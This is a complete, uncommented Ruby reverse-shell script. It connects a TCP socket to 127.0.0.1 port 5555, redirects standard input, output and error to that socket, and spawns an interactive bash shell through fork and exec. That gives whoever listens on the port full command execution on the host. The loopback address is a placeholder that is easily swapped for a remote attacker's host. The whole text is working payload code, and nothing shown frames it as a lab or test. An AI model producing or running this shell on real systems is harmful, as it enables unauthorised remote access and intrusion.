require 'socket'

s=TCPSocket.new("127.0.0.1",5555); 

$stdin.reopen(s); 
$stdout.reopen(s); 
$stderr.reopen(s); 

pid=fork{exec "/bin/bash", "-i"}; 

Process.wait(pid)

